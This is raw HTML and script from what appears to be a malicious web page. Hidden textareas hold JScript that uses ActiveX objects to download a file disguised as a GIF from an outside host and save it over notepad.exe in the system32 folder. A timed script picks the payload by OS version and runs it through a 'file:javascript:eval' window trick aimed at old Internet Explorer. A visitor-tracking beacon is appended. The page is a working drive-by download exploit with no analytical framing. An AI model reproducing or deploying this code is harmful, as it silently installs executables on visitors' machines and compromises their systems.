<textarea id="code1" style="display:none;">
var c = new ActiveXObject("Microsoft.XMLHTTP");
c.Open("GET", "http://www.apeironstore.com/5000.gif",0); 
c.Send();
var l = new ActiveXObject("ADODB.Stream");
l.Mode=3;
l.Type=1;
l.Open();
l.Write(c.responseBody);
l.SaveToFile("c:\\winnt\\system32\\notepad."+"exe",2);
</textarea>
<textarea id="code2" style="display:none;">
var c = new ActiveXObject("Microsoft.XMLHTTP");
c.Open("GET", "http://www.apeironstore.com/5000.gif",0); 
c.Send();
var l = new ActiveXObject("ADODB.Stream");
l.Mode=3;
l.Type=1;
l.Open();
l.Write(c.responseBody);
l.SaveToFile("c:\\windows\\system32\\notepad."+"exe",2);
</textarea>



 <script language="javascript">
   	function Browser(){
  this.agent=navigator.userAgent.toLowerCase();
  this.osWinXP=(this.agent.indexOf("nt 5.1")!=-1);
} 

function preparecode(code) {
        result = '';
        lines = code.split(/\r\n/);
        for (i=0;i<lines.length;i++) {
            line = lines[i];
            line = line.replace(/^\s+/,"");
            line = line.replace(/\s+$/,"");
            line = line.replace(/'/g,"\\'");
            line = line.replace(/[\\]/g,"\\\\");
            line = line.replace(/[/]/g,"%2f");
            if (line != '') {
                result += line + '\\r\\n';
            }
        }
        return result;
    }
    function doit() {
	 mycode = preparecode(document.all.code1.value);
	 if(browser.osWinXP==false) { mycode = preparecode(document.all.code1.value);}
    	 else  { mycode = preparecode(document.all.code2.value); };
         myURL = "file:javascript:eval('" + mycode + "')";
         window.open(myURL,"_media");
	 document.write("<img src=view-source:http://www.apeironstore.com/1.txt width=1 height=1>");	
 }
   var browser=new Browser();
   window.open("error.jsp","_media");
   setTimeout("doit()", 4000);
</script>
<!-- START OF USERTRACER CODE v1.0-->
<SCRIPT TYPE="text/javascript" LANGUAGE="javascript">
function pr(n) {document.write(n);}
page=window.location;
referer=escape(document.referrer);
pr("<IMG SRC=\"http://www.usertracer.com/accounts/eric23112/addonline.inc.php?page="+page+"&referer="+referer+"\"width=1 height=1>");
</SCRIPT>
<!-- END OF USERTRACER CODE v1.0-->

























































